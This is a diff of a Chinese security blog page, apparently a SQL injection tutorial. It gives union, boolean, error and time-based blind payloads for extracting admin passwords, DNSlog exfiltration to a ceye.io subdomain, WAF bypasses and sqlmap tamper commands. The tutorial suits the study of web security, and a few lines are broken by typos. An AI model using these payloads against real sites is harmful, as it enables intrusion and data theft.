@@ -165,6 +165,15 @@ var _hmt = _hmt || [];
 								
 							</ul>
 			
+							<ul>
+								<li class="file">
+									<a href="/ZeroP/2021/09/17/WEB%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/">
+										命令注入
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
 								</li>
 								
 							</ul>
@@ -293,37 +302,37 @@ var _hmt = _hmt || [];
 <p>再注入中<code>table_name</code>表示表名,<code>cloumn_name</code>表示列名</p>
 <h3 id="联合注入-union">联合注入(union)</h3>
 <p>1，使用and 1=1判断</p>
-<pre><code class="highlight sql">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> #有数据
-?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> #没有数据，存在注入漏洞</code></pre>
+<pre><code class="highlight mysql">?id=1 and 1=1 #有数据
+?id=1 and 1=2 #没有数据，存在注入漏洞</code></pre>
 <p>2，使用order  by判断有多少字段</p>
-<pre><code class="highlight sql">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span> #报错说明字段数小于<span class="number">3</span>
-?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span> #回显正常，说明字段数为<span class="number">2</span>
-?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="number">2</span> #回显正常，说明字段数为<span class="number">2</span>，如果<span class="keyword">order</span> <span class="keyword">by</span>被拦截可以试试<span class="keyword">group</span> <span class="keyword">by</span>原理是类似的</code></pre>
+<pre><code class="highlight mysql">?id=1 order by 3 #报错说明字段数小于3
+?id=1 order by 2 #回显正常，说明字段数为2
+?id=1 group by 2 #回显正常，说明字段数为2，如果order by被拦截可以试试group by原理是类似的</code></pre>
 <p>3，使用union联合查询</p>
-<pre><code class="highlight sq">?id=-1 union select null,null #查找显位，因为有两个字段，所以select也必须是两个字段</code></pre>
+<pre><code class="highlight mysql">?id=-1 union select null,null #查找显位，因为有两个字段，所以select也必须是两个字段</code></pre>
 <p>注：</p>
 <ul>
 <li>使用union时，为保证后面能够正常显示出来，需要保证前面查询不到值，所以<code>id=-1</code></li>
 <li>之所以使用null是因为不知道查询的字段的类型，所以用null，也有直接用1,2的，影响不大</li>
 </ul>
 <p>4，由上可以回显位置在index=1字段，所以开始查数据</p>
-<pre><code class="highlight sql">#数据库名查询
-?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> database(),<span class="keyword">null</span>
+<pre><code class="highlight mysql">#数据库名查询
+?id=-1 union select database(),null
 
 #版本号查询
-?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> version(),<span class="keyword">null</span>
+?id=-1 union select version(),null
 
 #根据数据库查表名使用group_concat()
-?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="keyword">null</span> <span class="keyword">from</span> inforamtion_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() #一般最好是用database()，如果直接用数据库名需要引号 `&quot;&quot;` 包起来
+?id=-1 union select group_concat(table_name),null from inforamtion_schema.tables where table_schema=database() #一般最好是用database()，如果直接用数据库名需要引号 `&quot;&quot;` 包起来
 
 #根据表名查字段名加入有admin表
-?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="keyword">null</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span>&quot;admin&quot; #这样可以查询出所有字段名
+?id=-1 union select group_concat(column_name),null from information_schema.columns where table_name=&quot;admin&quot; #这样可以查询出所有字段名
 
-#查出对应数据，加入admin中有<span class="keyword">user</span>,password字段
-?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> password,<span class="keyword">null</span> <span class="keyword">from</span> admin limit <span class="number">0</span>,<span class="number">1</span> #查询显示返回结果中的第一条，使用limit限制
-?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> password,<span class="keyword">null</span> <span class="keyword">from</span> admin limit <span class="number">1</span>,<span class="number">1</span> #查询显示返回结果中的第二条，使用limit限制
+#查出对应数据，加入admin中有user,password字段
+?id=-1 union select password,null from admin limit 0,1 #查询显示返回结果中的第一条，使用limit限制
+?id=-1 union select password,null from admin limit 1,1 #查询显示返回结果中的第二条，使用limit限制
 
-#<span class="keyword">user</span>字段的查询同理</code></pre>
+#user字段的查询同理</code></pre>
 <blockquote>
 <p>以上情况都是没有waf的情况，如果遇到狗，需要自己去尝试使用base64或者其他方式绕过</p>
 <p>切记只是在联合查询的时候id=-1，在前面判断是否存在注入的时候id=1</p>
@@ -331,43 +340,43 @@ var _hmt = _hmt || [];
 <h3 id="Boolean注入">Boolean注入</h3>
 <p>布尔型盲注页面是不会返回信息的，所以需要我们自己判断，True or False is boolean</p>
 <p>1，在参数后面使用and 1=1判断</p>
-<pre><code class="highlight sql">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> #页面回显正常
-?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> #页面报错，注意是报错而不是没有数据，由此可段为布尔盲注</code></pre>
+<pre><code class="highlight mysql">?id=1 and 1=1 #页面回显正常
+?id=1 and 1=2 #页面报错，注意是报错而不是没有数据，由此可段为布尔盲注</code></pre>
 <p>2，判断数据库长度length()</p>
-<pre><code class="highlight sql">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">8</span> #页面报错,数据库名长度并不等于<span class="number">8</span>
-?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">6</span> #页面报错，数据库名长度不等于<span class="number">6</span>
-?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">7</span> #页面正常显示，数据库名长度为<span class="number">7</span>
+<pre><code class="highlight mysql">?id=1 and length(database())=8 #页面报错,数据库名长度并不等于8
+?id=1 and length(database())=6 #页面报错，数据库名长度不等于6
+?id=1 and length(database())=7 #页面正常显示，数据库名长度为7
 
-?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(database())<span class="operator">&gt;=</span><span class="number">8</span> #页面报错,数据库名长度并不等于<span class="number">8</span>
-?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(database())<span class="operator">&lt;=</span><span class="number">6</span> #页面报错，数据库名长度不等于<span class="number">6</span>
-?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">7</span> #页面正常显示，数据库名长度为<span class="number">7</span>
-#以上足以说明布尔盲注需要的结果是准确值不像<span class="keyword">order</span> <span class="keyword">by</span>那样，只要在字段数范围内就正常显示</code></pre>
+?id=1 and length(database())&gt;=8 #页面报错,数据库名长度并不等于8
+?id=1 and length(database())&lt;=6 #页面报错，数据库名长度不等于6
+?id=1 and length(database())=7 #页面正常显示，数据库名长度为7
+#以上足以说明布尔盲注需要的结果是准确值不像order by那样，只要在字段数范围内就正常显示</code></pre>
 <p>3，获取数据库名 需要用到ascii()或substr()函数</p>
-<pre><code class="highlight sql">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span> #页面正常显示，表示数据库第一个字符为 a
-?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr(database(),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;b&#x27;</span> #页面报错，表示数据库第二个字符不为 b
-?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr(database(),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;d&#x27;</span> #页面显示正常，表示数据库第二个字符为 d
+<pre><code class="highlight mysql">?id=1 and substr(database(),1,1)=&#x27;a&#x27; #页面正常显示，表示数据库第一个字符为 a
+?id=1 and substr(database(),2,1)=&#x27;b&#x27; #页面报错，表示数据库第二个字符不为 b
+?id=1 and substr(database(),2,1)=&#x27;d&#x27; #页面显示正常，表示数据库第二个字符为 d
 
 
 #使用ascii（）个人不推荐，还要多次转换
-?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">97</span> #页面正常显示，表示数据库第一个字符的ascii码为<span class="number">97</span>，然后查询ASCII码表可知<span class="number">97</span>为a
-## ASCII码表中可显示字符的范围是：<span class="number">0</span><span class="operator">~</span><span class="number">127</span>
+?id=1 and ascii(substr(database(),1,1))=97 #页面正常显示，表示数据库第一个字符的ascii码为97，然后查询ASCII码表可知97为a
+## ASCII码表中可显示字符的范围是：0~127
 
 #依次执行可以查出数据库名，但是工程量有点大，可以自己写一个小公举使用python</code></pre>
 <p>4，获取表名</p>
 <p>获取表名的话和联合查询差不多，只是更加复杂</p>
-<pre><code class="highlight sql">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>&quot;查询出的数据库名&quot; limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span> #判断页面是否报错来确定查询出来的第一个表名的第一个字符是否为a
+<pre><code class="highlight mysql">?id=1 and substr((select table_name from information_schema.tables where table_schema=&quot;查询出的数据库名&quot; limit 0,1),1,1)=&#x27;a&#x27; #判断页面是否报错来确定查询出来的第一个表名的第一个字符是否为a
 
-#limit <span class="number">0</span>,<span class="number">1</span>主要是截取查询结果中的第一个结果
-#limit <span class="number">1</span>,<span class="number">1</span>截取插寻结果的第二个结果</code></pre>
+#limit 0,1主要是截取查询结果中的第一个结果
+#limit 1,1截取插寻结果的第二个结果</code></pre>
 <p>5，获取列名</p>
-<pre><code class="highlight sql">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;查询出的数据库名&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;查询出的表名&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>
+<pre><code class="highlight mysql">?id=1 and substr((select column_name from information_schema.columns where table_schema=&#x27;查询出的数据库名&#x27; and table_name=&#x27;查询出的表名&#x27; limit 0,1),1,1)=&#x27;a&#x27;
 
 #和查询表名是一样的原理</code></pre>
 <p>6，取数据，脱裤</p>
-<pre><code class="highlight sql">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> substr((<span class="keyword">select</span> &quot;列名&quot; <span class="keyword">from</span> &quot;表名&quot; limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>
+<pre><code class="highlight mysql">?id=1 and substr((select &quot;列名&quot; from &quot;表名&quot; limit 0,1),1,1)=&#x27;a&#x27;
 
 #查询第一行数据的第一个字母是否是a
-#limit主要是显示查询结果的第一个结果，limit <span class="number">1</span>,<span class="number">1</span>就是第二个结果</code></pre>
+#limit主要是显示查询结果的第一个结果，limit 1,1就是第二个结果</code></pre>
 <p>布尔盲注手工的话非常的繁琐，但是只要知道原理，也能自己写一个小脚本跑，还是sqlmap香</p>
 <h3 id="报错注入">报错注入</h3>
 <p>报错注入主要是利用数据库错误回显，前提是服务器开启了错误回显</p>
@@ -401,6 +410,86 @@ floor()        --返回小于等于该值得最大整数
 --floor()
 ?id=1 and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></pre>
 <h3 id="时间型盲注">时间型盲注</h3>
+<p>实现型盲注就是在报错注入失效的前提下完成的，如果服务器关闭了错误回显，就可以使用时间型盲注</p>
+<p>可以使用benchmark()，sleep()等造成延时效果的函数</p>
+<p>如果两个都被waf过滤后，可以让两个非常大的数据表做笛卡尔积产生大量的计算造成延时或者利用负责的正则表达式去匹配一个常常字符创来产生延时</p>
+<p>1，利用sleep判断数据库名长度</p>
+<pre><code class="highlight mysql">?id=1  and sleep(5) and 1=1 #页面返回不正常延时5秒
+?id=1 and sleep(5) and 1=2 #页面返回不正常不延时
+
+and if(length(database())&gt;1,sleep(5),1)
+#if(条件表达式，真，假) 类似于三目运算</code></pre>
+<p>2，获取数据库名</p>
+<pre><code class="highlight mysql">?id=1 and if(substr(database(),1,1)=&#x27;a&#x27;,sleep(5),1</code></pre>
+<p>后面的获取表名字段名数据依次类推即可，和前面的布尔盲注一样</p>
+<h4 id="时间型盲注的加速方式">时间型盲注的加速方式</h4>
+<p>1，Windows平台的MySQL可以使用DNSlog加速注入</p>
+<p>2，利用二分查找，sqlmap就是使用的二分查找</p>
+<h3 id="注入技巧">注入技巧</h3>
+<h4 id="DNSlog盲注">DNSlog盲注</h4>
+<p>DNS在解析的时候会留下日志，通过读取多级域名的解析日志，获取请求信息；</p>
+<p>DNSlog就是记录用户访问网站域名时，记录DNS和对应的IP 的转换访问</p>
+<p>MySQL load_file()函数可以发起请求，使用DNSlog接收请求，获取数据库数据</p>
+<pre><code class="highlight mysql">union select 1,2,load_file(concat(&#x27;\\\\&#x27;,(select hex(pass) from user where name=&#x27;admin&#x27;),&#x27;.test.ceye.io\\aa&#x27;))
+
+#Hex编码的目的是减少特殊字符的干扰，因为域名的话有些字符是有特殊含义的</code></pre>
+<blockquote>
+<p>注意：load_file()只能在windows平台上才能发起，linux下dnslog无效</p>
+<p>因为UNC通用命名规范，四个&quot;“会被转义成两个”&quot;</p>
+</blockquote>
+<h4 id="时间盲注使用DNSlog">时间盲注使用DNSlog</h4>
+<pre><code class="highlight mysql">?id=1 and if((select load_file(concat(&#x27;\\\\&#x27;,(select hex(database())),&#x27;.xxx.ceye.io\\abss&#x27;))),sleep(5),1)%23</code></pre>
+<blockquote>
+<p>MySQL数据库配置中要设置secure_file_priv为空,才能完整的去请求DNS，所以一般需要知道MySQL的数据库版本，这个级版本在信息收集的时候会完成</p>
+<p>secure-file-priv参数是用来限制 LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的</p>
+<ul>
+<li>ure_file_priv的值为null ，表示限制mysqld 不允许导入|导出</li>
+<li>当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下</li>
+<li>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</li>
+</ul>
+</blockquote>
+<h4 id="宽字节注入（过滤单引号）">宽字节注入（过滤单引号）</h4>
+<blockquote>
+<p>在数据库中使用的宽字符集（GBK,GB2312等），除了英文都是一个字符占两字节；</p>
+<p>MySQL在使用GBK编码的时候，会认为两个字符为一个汉字(ascii&gt;128才能达到汉字范围)；</p>
+<p>在PHP中使用<code>addslashes</code>函数的时候，会对单引号%27进行转义，在前边加一个反斜杠”\”，变成%5c%27;</p>
+<p>可以在前边添加%df,形成%df%5c%27，而数据进入数据库中时前边的%df%5c两字节会被当成一个汉字;</p>
+<p>%5c被吃掉了，单引号由此逃逸可以用来闭合语句。</p>
+</blockquote>
+<h4 id="base64注入">base64注入</h4>
+<pre><code class="highlight mysql">http://xxxx.com/?id=MQ== #只对参数编码
+http://xxx.com/?aWQ9MQ== #连同参数名一起加密</code></pre>
+<p>只加密参数可以使用sqlmap的脚本，sqlmap的具体使用在工具篇</p>
+<pre><code class="highlight mysql">sqlmap.py -u &quot;http://xxx.com/?id=MQ==&quot; --tamper  base64encode.py --dbs</code></pre>
+<p>参数名一起加密就需要用中转注入</p>
+<pre><code class="highlight php"><span class="comment">//trans_sqli.php</span>
+<span class="meta">&lt;?php</span>
+	<span class="variable">$id</span>=base64_encode(<span class="string">&quot;id=&quot;</span>.<span class="variable">$_GET</span>[id]);
+	<span class="keyword">echo</span> file_get_contents(<span class="string">&quot;http://xxx.com/sqli.php?<span class="subst">&#123;$id&#125;</span>&quot;</span>) <span class="comment">//http://xxx.com/sqli.php?&#123;$id&#125;目标网址</span>
+<span class="meta">?&gt;</span></code></pre>
+<pre><code class="highlight mysql">sqlmap.py -u &quot;http://127.0.0.1/trans_sqli.php?id=12&quot; -v 3 --dbs</code></pre>
+<h4 id="过滤逗号">过滤逗号</h4>
+<h5 id="盲注的时候">盲注的时候</h5>
+<pre><code class="highlight mysql">LIMIT M OFFSET N
+#这里的M是最大回显限度，N是偏移量
+#和limit N,M相似
+
+?id=1 and ascii(substr((select database())limit 0,1))=97
+#可以替换成以下类型
+?id=1 and ascii(substr((select database())from 0 fot 1))=97</code></pre>
+<h5 id="Union联合查询时">Union联合查询时</h5>
+<pre><code class="highlight mysql">union select 1,2,3
+union select * from ((select 1)a join (select 2)b join (select 3)c)%23
+union select * from ((select 1)a JOIN (select 2)b JOIN (select CONCAT_WS(CHAR(32,58,32),user(),database(),version()))c)%23</code></pre>
+<h5 id="Between-And-代替尖括号">Between And 代替尖括号&quot;&gt;&quot;</h5>
+<p><em>在sqlmap中使用between and代替其他字符加上 --tamper=between即可</em></p>
+<h6 id="判断真假">判断真假</h6>
+<pre><code class="highlight mysql">2 &gt; 1  #真
+0 &gt; 1  #假
+
+2 between 1 and 3  #真
+3 between 1 and 2  #假</code></pre>
+<p>此外between and还支持16进制，可以绕过引号限制</p>
 
 </div>
 
